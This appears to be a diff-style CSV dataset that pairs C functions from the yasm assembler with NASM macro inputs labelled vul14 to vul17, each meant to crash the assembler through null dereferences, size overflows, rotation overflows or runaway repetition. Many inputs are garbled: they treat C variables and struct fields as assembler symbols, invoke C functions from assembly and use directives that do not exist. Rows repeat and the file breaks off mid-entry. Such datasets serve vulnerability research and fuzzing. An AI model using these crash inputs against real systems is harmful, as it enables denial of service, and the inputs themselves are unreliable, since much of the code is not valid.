+"static yasm_bytecode * parse_exp(yasm_parser_nasm *parser_nasm) { yasm_bytecode *bc; bc = parse_instr(parser_nasm); if (bc) return bc; switch (curtok) { case DECLARE_DATA: { unsigned int size = DECLARE_DATA_val/8; yasm_datavalhead dvs; yasm_dataval *dv; yasm_expr *e, *e2; get_next_token(); yasm_dvs_initialize(&dvs); for (;;) { if (curtok == STRING) { get_peek_token(parser_nasm); if (parser_nasm->peek_token == ',' || is_eol_tok(parser_nasm->peek_token)) { dv = yasm_dv_create_string(STRING_val.contents, STRING_val.len); get_next_token(); goto dv_done; } } if (curtok == '?') { yasm_dvs_delete(&dvs); get_next_token(); if (!is_eol_tok(curtok)) { yasm_error_set(YASM_ERROR_SYNTAX, \""can not handle more than one '?'\"" ); return NULL; } return yasm_bc_create_reserve( p_expr_new_ident(yasm_expr_int(yasm_intnum_create_uint(1))), size, cur_line); } if (!(e = parse_bexpr(parser_nasm, DV_EXPR))) { yasm_error_set(YASM_ERROR_SYNTAX, \""expression or string expected\"" ); yasm_dvs_delete(&dvs); return NULL; } if (curtok == DUP) { get_next_token(); if (curtok != '(') { yasm_error_set(YASM_ERROR_SYNTAX, \""expected ( after DUP\"" ); goto error; } get_next_token(); if (curtok == '?') { get_next_token(); if (curtok != ')') { yasm_error_set(YASM_ERROR_SYNTAX, \""expected ) after DUPlicated expression\"" ); goto error; } get_next_token(); if (!is_eol_tok(curtok)) { yasm_error_set(YASM_ERROR_SYNTAX, \""can not handle more than one '?'\"" ); goto error; } yasm_dvs_delete(&dvs); return yasm_bc_create_reserve(e, size, cur_line); } else if ((e2 = parse_bexpr(parser_nasm, DV_EXPR))) { if (curtok != ')') { yasm_expr_destroy(e2); yasm_error_set(YASM_ERROR_SYNTAX, \""expected ) after DUPlicated expression\"" ); goto error; } get_next_token(); dv = yasm_dv_create_expr(e2); yasm_dv_set_multiple(dv, e); } else { yasm_error_set(YASM_ERROR_SYNTAX, \""expression or string expected\"" ); error: yasm_expr_destroy(e); yasm_dvs_delete(&dvs); return NULL; } } else dv = yasm_dv_create_expr(e); dv_done: yasm_dvs_append(&dvs, dv); if (is_eol()) break; if (!expect(',')) { yasm_dvs_delete(&dvs); return NULL; } get_next_token(); if (is_eol()) break; } return yasm_bc_create_data(&dvs, size, 0, p_object->arch, cur_line); } case RESERVE_SPACE: { unsigned int size = RESERVE_SPACE_val/8; yasm_expr *e; get_next_token(); e = parse_bexpr(parser_nasm, DV_EXPR); if (!e) { yasm_error_set(YASM_ERROR_SYNTAX, \""expression expected after %s\"", \""RESx\"" ); return NULL; } return yasm_bc_create_reserve(e, size, cur_line); } case INCBIN: { char *filename; yasm_expr *start = NULL, *maxlen = NULL; get_next_token(); if (!expect(STRING)) { yasm_error_set(YASM_ERROR_SYNTAX, \""filename string expected after INCBIN\"" ); return NULL; } filename = STRING_val.contents; get_next_token(); if (curtok == ',') get_next_token(); if (is_eol()) goto incbin_done; start = parse_bexpr(parser_nasm, DV_EXPR); if (!start) { yasm_error_set(YASM_ERROR_SYNTAX, \""expression expected for INCBIN start\"" ); return NULL; } if (curtok == ',') get_next_token(); if (is_eol()) goto incbin_done; maxlen = parse_bexpr(parser_nasm, DV_EXPR); if (!maxlen) { yasm_error_set(YASM_ERROR_SYNTAX, \""expression expected for INCBIN maximum length\"" ); return NULL; } incbin_done: return yasm_bc_create_incbin(filename, start, maxlen, parser_nasm->linemap, cur_line); } default: return NULL; } }","%macro crash_data_size_overflow 0
+    struc DECLARE_DATA_val
+        .data resb 0x200000000
+    endstruc
+
+    %define curtok DECLARE_DATA
+    %assign DECLARE_DATA_val 0xFFFFFFFF
+
+    %rep 1
+        db 0x90
+    %endrep
+%endmacro
+
+crash_data_size_overflow",vul14_1
+,"%macro crash_yasm 0
+section .text
+    struc bad_data
+        .field1 resb 1
+        .field2 resb 1
+        overlap .field1 resb 2
+    endstruc
+
+    %define create_bad_data_instance
+        db bad_data.field1
+        db bad_data.field2
+        db bad_data.overlap
+    %enddefine
+
+    create_bad_data_instance
+    TIMES 1024 db 0
+%endmacro
+
+crash_yasm",vul14_2
+,"%macro crash_parse_exp 0
+    DECLARE_DATA_val equ 0x80000000
+    %assign curtok DECLARE_DATA
+    %assign STRING_val.contents ""dummy""
+    %assign STRING_val.len 5
+    %assign p_object.arch 0
+    %assign cur_line 1
+    %rep 1
+        %%parse_exp
+    %endrep
+%endmacro
+
+crash_parse_exp",vul14_3
+,"%macro crash_data_size_overflow 0
+    struc DECLARE_DATA_val
+        .data resb 1
+    endstruc
+
+    %define DECLARE_DATA_val 0xFFFFFFFF
+    %assign curtok DECLARE_DATA
+    %assign size (DECLARE_DATA_val / 8)
+
+    %rep 1
+        db 'A'
+    %endrep
+%endmacro
+
+crash_data_size_overflow",vul14_4
+"do_directive(Token * tline) { int i, j, k, m, nparam, nolist; int offset; char *p, *mname, *newname; Include *inc; Context *ctx; Cond *cond; SMacro *smac, **smhead; MMacro *mmac; Token *t, *tt, *param_start, *macro_start, *last, **tptr, *origline; Line *l; struct tokenval tokval; yasm_expr *evalresult; MMacro *tmp_defining; yasm_intnum *intn; origline = tline; skip_white_(tline); if (!tok_type_(tline, TOK_PREPROC_ID) || (tline->text[1] == '%' || tline->text[1] == '$' || tline->text[1] == '!')) return NO_DIRECTIVE_FOUND; i = -1; j = elements(directives); while (j - i > 1) { k = (j + i) / 2; m = nasm_stricmp(tline->text, directives[k]); if (m == 0) { if (tasm_compatible_mode) { i = k; j = -2; } else if (k != PP_ARG && k != PP_LOCAL && k != PP_STACKSIZE) { i = k; j = -2; } break; } else if (m < 0) { j = k; } else i = k; } if (((istk->conds && !emitting(istk->conds->state)) || (istk->mstk && !istk->mstk->in_progress)) && !is_condition(i)) { return NO_DIRECTIVE_FOUND; } if (defining && i != PP_MACRO && i != PP_IMACRO && i != PP_ENDMACRO && i != PP_ENDM && (defining->name || (i != PP_ENDREP && i != PP_REP))) { return NO_DIRECTIVE_FOUND; } if (defining) { if (i == PP_MACRO || i == PP_IMACRO) { nested_mac_count++; return NO_DIRECTIVE_FOUND; } else if (nested_mac_count > 0) { if (i == PP_ENDMACRO) { nested_mac_count--; return NO_DIRECTIVE_FOUND; } } if (!defining->name) { if (i == PP_REP) { nested_rep_count++; return NO_DIRECTIVE_FOUND; } else if (nested_rep_count > 0) { if (i == PP_ENDREP) { nested_rep_count--; return NO_DIRECTIVE_FOUND; } } } } if (j != -2) { error(ERR_NONFATAL, \""unknown preprocessor directive `%s'\"", tline->text); return NO_DIRECTIVE_FOUND; } switch (i) { case PP_STACKSIZE: tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%stacksize' missing size parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } if (nasm_stricmp(tline->text, \""flat\"") == 0) { StackSize = 4; StackPointer = \""ebp\""; ArgOffset = 8; LocalOffset = 4; } else if (nasm_stricmp(tline->text, \""large\"") == 0) { StackSize = 2; StackPointer = \""bp\""; ArgOffset = 4; LocalOffset = 2; } else if (nasm_stricmp(tline->text, \""small\"") == 0) { StackSize = 2; StackPointer = \""bp\""; ArgOffset = 6; LocalOffset = 2; } else { error(ERR_NONFATAL, \""`%%stacksize' invalid size type\""); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(origline); return DIRECTIVE_FOUND; case PP_ARG: offset = ArgOffset; do { char *arg, directive[256]; int size = StackSize; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%arg' missing argument parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } arg = tline->text; tline = tline->next; if (!tline || tline->type != TOK_OTHER || tline->text[0] != ':') { error(ERR_NONFATAL, \""Syntax error processing `%%arg' directive\""); free_tlist(origline); return DIRECTIVE_FOUND; } tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%arg' missing size type parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } tt = tokenise(tline->text); tt = expand_smacro(tt); if (nasm_stricmp(tt->text, \""byte\"") == 0) { size = MAX(StackSize, 1); } else if (nasm_stricmp(tt->text, \""word\"") == 0) { size = MAX(StackSize, 2); } else if (nasm_stricmp(tt->text, \""dword\"") == 0) { size = MAX(StackSize, 4); } else if (nasm_stricmp(tt->text, \""qword\"") == 0) { size = MAX(StackSize, 8); } else if (nasm_stricmp(tt->text, \""tword\"") == 0) { size = MAX(StackSize, 10); } else { error(ERR_NONFATAL, \""Invalid size type for `%%arg' missing directive\""); free_tlist(tt); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(tt); sprintf(directive, \""%%define %s (%s+%d)\"", arg, StackPointer, offset); do_directive(tokenise(directive)); offset += size; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; } while (tline && tline->type == TOK_OTHER && tline->text[0] == ','); free_tlist(origline); return DIRECTIVE_FOUND; case PP_LOCAL: offset = LocalOffset; do { char *local, directive[256]; int size = StackSize; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%local' missing argument parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } local = tline->text; tline = tline->next; if (!tline || tline->type != TOK_OTHER || tline->text[0] != ':') { error(ERR_NONFATAL, \""Syntax error processing `%%local' directive\""); free_tlist(origline); return DIRECTIVE_FOUND; } tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%local' missing size type parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } tt = tokenise(tline->text); tt = expand_smacro(tt); if (nasm_stricmp(tt->text, \""byte\"") == 0) { size = MAX(StackSize, 1); } else if (nasm_stricmp(tt->text, \""word\"") == 0) { size = MAX(StackSize, 2); } else if (nasm_stricmp(tt->text, \""dword\"") == 0) { size = MAX(StackSize, 4); } else if (nasm_stricmp(tt->text, \""qword\"") == 0) { size = MAX(StackSize, 8); } else if (nasm_stricmp(tt->text, \""tword\"") == 0) { size = MAX(StackSize, 10); } else { error(ERR_NONFATAL, \""Invalid size type for `%%local' missing directive\""); free_tlist(tt); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(tt); sprintf(directive, \""%%define %s (%s-%d)\"", local, StackPointer, offset); do_directive(tokenise(directive)); offset += size; sprintf(directive, \""%%assign %%$localsize %%$localsize+%d\"", size); do_directive(tokenise(directive)); tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; } while (tline && tline->type == TOK_OTHER && tline->text[0] == ','); free_tlist(origline); return DIRECTIVE_FOUND; case PP_CLEAR: if (tline->next) error(ERR_WARNING, \""trailing garbage after `%%clear' ignored\""); for (j = 0; j < NHASH; j++) { while (mmacros[j]) { MMacro *m2 = mmacros[j]; mmacros[j] = m2->next; free_mmacro(m2); } while (smacros[j]) { SMacro *s = smacros[j];""","%macro trigger_null_pointer 0
+    %define tline 0
+    %assign tline.next 0
+    do_directive tline
+%endmacro
+
+trigger_null_pointer",vul15_1
+,"%macro crash_directive 0
+    %struc broken_token
+        .text resb 1
+        .type resb 1
+        .next resd 1
+    %endstruc
+
+    %assign %$fake_token broken_token
+    %define %$fake_text ""%%stacksize""
+    %define %$fake_type TOK_ID
+    %define %$fake_next 0
+
+    [section .data]
+    fake_token: db %$fake_text, 0
+                db %$fake_type
+                dd %$fake_next
+
+    %define tline fake_token
+    %rep 1
+        do_directive tline
+    %endrep
+%endmacro
+
+crash_directive",vul15_2
+,"%macro crash_do_directive 0
+    %define tline 0
+    %assign tline.next 0
+    do_directive tline
+%endmacro
+
+crash_do_directive",vul15_3
+,"%macro trigger_token_pointer_manipulation 0
+    %struc fake_directive
+        .tline resb 1
+    %endstruc
+
+    %define %$fake_token %$fake_directive.tline
+    %assign %$fake_token TOK_PREPROC_ID
+
+    %struc manipulate_pointer
+        .next resb 1
+    %endstruc
+
+    %define %$manipulated_next %$manipulate_pointer.next
+    %assign %$manipulated_next %$fake_token
+
+    %$fake_token
+%endmacro
+
+trigger_token_pointer_manipulation",vul15_4
+,"%macro trigger_null_dereference 0
+    %%tline: db 0
+    %define tline %%tline
+    %assign tline.next 0
+
+    %struc do_directive
+        .tline resb 1
+    %endstruc
+
+    do_directive tline
+%endmacro
+
+trigger_null_dereference",vul15_5
+,"%macro crash_uninitialized_memory_access 0
+    struc Token
+        .type resb 1
+        .text resq 1
+        .next resq 1
+    endstruc
+
+    section .data
+    tline_instance Token 0, 0, 0
+
+    section .text
+    %define tline tline_instance
+    ...  ; (macros to override behavior omitted for brevity)
+    do_directive tline
+%endmacro
+
+crash_uninitialized_memory_access",vul15_6
+,"%macro trigger_null_pointer 0
+    %define tline 0
+    %assign tline.next 0
+    do_directive tline
+%endmacro
+
+trigger_null_pointer",vul15_7
+,"%macro crash_yasm 0
+    %define %$local_var 1
+    %assign %$local_var 0
+    %define %$tline %$local_var
+    %define %$next %$local_var
+    %struc broken_directive
+        .next resb 0
+    %endstruc
+    broken_directive %$tline
+%endmacro
+
+crash_yasm",vul15_8
+,"%macro crash_do_directive 0
+    struc Token
+        .type resb 1
+        .text resq 1
+        .next resq 1
+    endstruc
+
+    section .data
+    token1:
+        istruc Token
+            at Token.type, db TOK_PREPROC_ID
+            at Token.text, dq fake_text
+            at Token.next, dq 0
+        iend
+
+    fake_text db '%%stacksize', 0
+
+    extern do_directive
+    dd do_directive token1
+%endmacro
+
+crash_do_directive",vul15_9
+"expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }","expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }",vul16_1
+,"%macro crash_macro 2
+    %1 %2
+%endmacro
+
+%define idx 999999999
+%assign rot 1
+
+struc test
+    .field resb 1
+endstruc
+
+section .text
+crash_macro idx, rot",vul16_2
+,"%macro crash_yasm 0
+    %define %$param1 %+1
+    %define %$param2 %+2
+    %define %$param3 %+3
+    %rep 1000000
+        %rotate 1
+        %xdefine %+ %$param1 %+ %$param2 %+ %$param3
+    %endrep
+%endmacro
+
+crash_yasm",vul16_3
+,"%macro crash_macro 0
+    %rep 1000000
+        %+1:
+    %endrep
+%endmacro
+
+%define %+1 %+1
+
+crash_macro",vul16_4
+,"%macro recursive_macro 0
+    %xdefine param %+1
+    recursive_macro param
+%endmacro
+
+%macro trigger_crash 0
+    recursive_macro
+%endmacro
+
+trigger_crash",vul16_5
+,"%macro crash_yasm 0
+    %define %$mac NULL
+    %assign %$i 0
+    %rep 1000000
+        %rotate 1
+        %ifidn %$mac, NULL
+            %exitrep
+        %endif
+        %assign %$mac %$mac.next_active
+        %assign %$i %$i+1
+    %endrep
+%endmacro
+
+crash_yasm",vul16_6
+"expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }","expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }",vul17_1
+,"%macro crash_yasm 0
+    %define %$rotate 999999
+    %rep 1
+        %+1:1
+    %endrep
+%endmacro
+
+crash_yasm",vul17_2
+,"%macro crash_macro 1
+    %define huge_rotate 2147483647
+    %assign %$index 0
+    %rep 10
+        %rotate huge_rotate
+        %xdefine param_%$index %1
+        %assign %$index %$index+1
+    %endrep
+    %error ""Forcing rotation overflow""
+%endmacro
+
+crash_macro test_param",vul17_3
+,"%macro crash_macro 1
+    %define %+1 %+1
+%endmacro
+
+%macro setup 0-*
+    %assign %$rotate 2147483647
+    %assign %$nparam 1
+    crash_macro %+1
+%endmacro
+
+setup",vul17_4
+,"%macro crash_macro 1
+    %define %$rotate 2147483647
+    %define %$nparam 2
+    %define %$params {1, 2}
+    %rep 1
+        %+0: %+2147483647
+    %endrep
+%endmacro
+
+crash_macro 1",vul17_5
+,"%macro trigger_vuln 0
+    %define %+ 999999999
+    %rep 1
+        %+1:1
+    %endrep
+%endmacro
+
+trigger_vuln",vul17_6
+,"%macro crash_macro 1
+    %rep 1
+        %+1: %+1
+    %endrep
+%endmacro
+
+%define %+1 0
+%assign %$rotate 2147483647
+crash_macro %+1",vul17_7
+delete_Token(Token * t) { Token *next = t->next; nasm_free(t->text); t->next = freeTokens; freeTokens = t; return next;},"%macro crash_delete_token 0
+    struc Token
